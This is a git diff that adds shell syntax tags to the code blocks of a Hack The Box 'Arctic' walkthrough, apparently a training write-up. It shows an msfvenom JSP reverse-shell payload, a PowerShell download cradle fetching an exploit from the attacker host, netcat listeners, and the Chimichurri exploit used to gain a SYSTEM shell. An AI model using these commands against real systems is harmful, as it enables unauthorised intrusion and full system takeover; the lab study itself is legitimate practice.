@@ -9,7 +9,7 @@ so I decided to reorganize my notes, as they were somewhat of a mess and restruc
 ### Initial Enumeration
 
 First, let's start with a quick nmap scan to see what we get.
-```
+```shell
 root@kali:~/htb/arctic# nmap -sV 10.10.10.11
 
 Nmap scan report for 10.10.10.11
@@ -45,7 +45,7 @@ So we have a hash of `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`
 
 Using hash-identifier we see the hash is most likely SHA-1.
 
-```
+```shell
 root@kali:~/htb/arctic# hash-identifier
    #########################################################################
    #	 __  __ 		    __		 ______    _____	   #
@@ -81,14 +81,14 @@ At this point we need to generate a shell. We could upload a cfexec.cfm shell (l
 
 To generate a JSP shell, we use msfvenom and set our parameters accordingly.
 
-```
+```shell
 root@kali:~/htb/arctic# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f raw > shell.jsp
 Payload size: 1496 byte
 ```
 
 Now that we have our shell created let's serve up the file from Kali using a python SimpleHTTPServer
 
-```
+```shell
 root@kali:~/htb/arctic# python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 ```
@@ -106,7 +106,7 @@ After submitting we run the task on demand under Actions, and we can see the 200
 
 Fire up a netcat listener and we can now browse to our shell at `http://10.10.10.11:8500/CFIDE/shell.jsp`
 
-```
+```shell
 root@kali:~/htb/arctic# nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49212
@@ -125,7 +125,7 @@ And we can grab the user.txt flag on tolis' desktop.
 
 Tolis doesn't seem to be an administrator on the system so we will need to escalate. One of the first things I do for privilege escalation on Windows is grab system information, so that we can identify the OS and also see if its missing any patches.
 
-```
+```shell
 C:\>systeminfo
 systeminfo
 
@@ -179,7 +179,7 @@ The Exploit-DB download only contained source files and no compiled exe. For wha
 
 Once again we setup a python http server on Kali and to download to our target a simple powershell script will do the trick.
 
-```
+```shell
 C:\ColdFusion8>echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 
 C:\ColdFusion8>echo $url = "http://10.10.14.10/chimichurri.exe" >>wget.ps1
@@ -193,13 +193,14 @@ C:\ColdFusion8>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -N
 
 We verify the download, start a netcat listener, and run the exploit.
 
-```
+```shell
 C:\ColdFusion8>exploit.exe 10.10.14.10 443
 
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
 
-```
+
+```shell
 root@kali:~/htb/arctic# nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49267
